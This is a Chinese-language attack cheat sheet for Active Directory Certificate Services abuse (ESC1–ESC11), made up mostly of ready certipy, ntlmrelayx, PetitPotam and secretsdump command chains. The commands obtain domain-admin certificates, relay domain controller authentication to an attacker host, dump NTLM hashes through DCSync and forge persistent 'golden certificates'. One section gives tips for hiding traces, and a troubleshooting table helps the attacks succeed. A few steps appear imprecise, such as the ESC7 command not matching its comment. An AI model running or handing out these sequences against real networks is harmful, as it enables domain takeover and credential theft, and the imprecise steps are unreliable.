# ADCS ESC1-ESC11 漏洞利用详解

## ESC1: 可控 SAN 的证书模板

**条件**：
- 模板启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`
- 低权限用户有 Enroll 权限
- 模板启用了 Client Authentication EKU

```bash
# Certipy 枚举（自动标注 ESC1）
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -vulnerable

# 利用：申请域管证书
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template TEMPLATE_NAME \
  -upn administrator@DOMAIN

# 认证
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# 输出 NTLM Hash

# DCSync
impacket-secretsdump -hashes :NTLM_HASH DOMAIN/administrator@DC_IP
```

## ESC2: Any Purpose / SubCA 模板

**条件**：
- 模板 EKU 为 `Any Purpose` 或 `SubCA`
- 低权限用户有 Enroll 权限

```bash
# Any Purpose 可以当客户端认证用
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template TEMPLATE_NAME

# SubCA 证书可以签发子证书
# 先申请 SubCA 证书，然后用它签发任意证书
```

## ESC3: Certificate Request Agent

**条件**：
- 模板 A 有 Certificate Request Agent EKU + 低权限可 Enroll
- 模板 B 允许代理注册（enrollment agent）

```bash
# 第一步：申请 Request Agent 证书
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template AGENT_TEMPLATE

# 第二步：用 Agent 证书代理申请域管证书
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template TARGET_TEMPLATE \
  -on-behalf-of 'DOMAIN\administrator' \
  -pfx agent.pfx
```

## ESC4: 模板写权限

**条件**：
- 低权限用户对证书模板有 WriteDacl / WriteOwner / WriteProperty

```bash
# 检查模板 ACL
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -vulnerable
# 查找 "Write" 权限标记

# 修改模板为 ESC1 配置
certipy template -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -template TEMPLATE_NAME -save-old

# 利用修改后的模板
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template TEMPLATE_NAME \
  -upn administrator@DOMAIN

# 恢复模板（可选，减少痕迹）
certipy template -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -template TEMPLATE_NAME -configuration TEMPLATE_NAME.json
```

## ESC6: CA 全局 SAN 配置

**条件**：
- CA 启用了 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志
- 任意可注册模板

```bash
# 检查
certutil -config "CA_SERVER\CA-NAME" -getreg policy\EditFlags
# 如果包含 EDITF_ATTRIBUTESUBJECTALTNAME2 → 全局 ESC1

# 利用：任何模板都可以指定 SAN
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template User \
  -upn administrator@DOMAIN
```

## ESC7: CA 管理员权限

**条件**：
- 用户有 ManageCA 或 ManageCertificates 权限

```bash
# 如果有 ManageCA → 可以自己开启 ESC6
# 开启 EDITF_ATTRIBUTESUBJECTALTNAME2
certipy ca -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -enable-template SubCA

# 申请 SubCA 证书（会被拒绝）
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -template SubCA -upn administrator@DOMAIN
# 记录 Request ID

# 用 ManageCertificates 权限批准被拒绝的请求
certipy ca -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -issue-request REQUEST_ID

# 下载已批准的证书
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP \
  -ca CA-NAME -retrieve REQUEST_ID
```

## ESC8: NTLM Relay 到 ADCS Web Enrollment

这是实战中最常用的 ADCS 攻击路径。

```bash
# 1. 确认 ADCS Web Enrollment
curl -sk https://CA_SERVER/certsrv/
# 或
curl -sk http://CA_SERVER/certsrv/

# 2. 启动中继
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# 3. 触发域控认证（选一种）
# PetitPotam
python3 PetitPotam.py ATTACKER_IP DC_IP
# PrinterBug
python3 dementor.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP

# 4. 获取证书（ntlmrelayx 输出 Base64）
echo "MIIRd..." | base64 -d > dc.pfx

# 5. 认证
certipy auth -pfx dc.pfx -dc-ip DC_IP
# 获取域控机器账户 NTLM Hash

# 6. DCSync
impacket-secretsdump -hashes :HASH DOMAIN/DC_HOSTNAME$@DC_IP
```

## ESC9: No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)

**条件**：
- 模板设置了 `msPKI-Enrollment-Flag` 包含 `CT_FLAG_NO_SECURITY_EXTENSION`
- `StrongCertificateBindingEnforcement` 未设置为 2

```bash
# 修改用户的 UPN 为目标用户
# 申请证书（证书中嵌入的 SID 映射不严格）
# 恢复 UPN
# 用证书认证为目标用户
certipy shadow auto -u USER@DOMAIN -p PASS -dc-ip DC_IP -account TARGET_USER
```

## ESC10: 弱证书绑定

**条件**：
- `CertificateMappingMethods` 包含 `UPN` 映射
- 可以修改目标用户的 UPN

类似 ESC9，利用 UPN 映射的宽松性。

## ESC11: ICPR (RPC) 中继

```bash
# 类似 ESC8 但通过 RPC 而非 HTTP
# 当 Web Enrollment 不可用但 RPC 端点可用时
ntlmrelayx.py -t "rpc://CA_SERVER" -rpc-mode icpr \
  -smb2support --adcs --template DomainController
```

## 证书持久化

```bash
# Golden Certificate（获取 CA 私钥后）
# 可以伪造任意用户的证书，永久有效
certipy forge -ca-pfx ca.pfx -upn administrator@DOMAIN -subject "CN=Administrator"
certipy auth -pfx forged.pfx -dc-ip DC_IP
```

## 故障排查

| 错误 | 原因 | 解决 |
|------|------|------|
| KDC_ERR_PADATA_TYPE_NOSUPP | DC 不支持 PKINIT | 用 Schannel: `certipy auth -pfx x.pfx -ldap-shell` |
| KDC_ERR_CLIENT_NOT_TRUSTED | 证书链不受信任 | 检查 CA 证书是否在 NTAuth 中 |
| CERTSRV_E_TEMPLATE_DENIED | 无注册权限 | 换模板或提权后再试 |
| "Certificate not found" | certipy 版本问题 | 更新 certipy: `pip install certipy-ad --upgrade` |
